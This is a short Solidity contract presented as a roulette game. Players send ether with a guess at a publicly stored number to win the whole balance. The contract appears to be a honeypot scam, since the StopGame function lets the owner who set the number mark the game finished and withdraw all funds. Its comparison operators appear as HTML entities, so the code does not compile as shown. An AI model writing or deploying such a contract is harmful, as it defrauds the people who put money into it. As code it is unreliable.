pragma solidity ^0.4.20;

contract RouletteGame
{

    uint8 public result = 0;

    bool public finished = false;

    address public rouletteOwner;

    function Play(uint8 _bet)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(result == _bet &amp;&amp; msg.value&gt;0.001 ether &amp;&amp; !finished)
        {
            msg.sender.transfer(this.balance);
            GiftHasBeenSent();
        }
    }

    function StartRoulette(uint8 _number)
    public
    payable
    {
        if(result==0)
        {
            result = _number;
            rouletteOwner = msg.sender;
        }
    }

    function StopGame()
    public
    payable
    {
        require(msg.sender == rouletteOwner);
        GiftHasBeenSent();
        if (msg.value&gt;0.001 ether){
            msg.sender.transfer(this.balance);
        }
    }

    function GiftHasBeenSent()
    private
    {
        finished = true;
    }

    function() public payable{}
}